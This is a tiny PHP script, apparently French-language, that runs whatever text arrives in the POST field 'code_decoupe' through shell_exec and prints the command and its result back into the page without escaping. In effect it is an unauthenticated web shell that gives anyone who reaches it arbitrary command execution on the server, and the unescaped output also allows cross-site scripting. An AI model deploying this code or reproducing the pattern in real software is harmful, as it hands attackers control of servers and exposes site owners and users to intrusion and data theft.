<?php

$code = $_POST["code_decoupe"];
$res = shell_exec($code);


?>
<p style="font-family:'Courier New';"><?php echo $code ?></p>
<p>Résultat : <?php echo $res; ?></p>
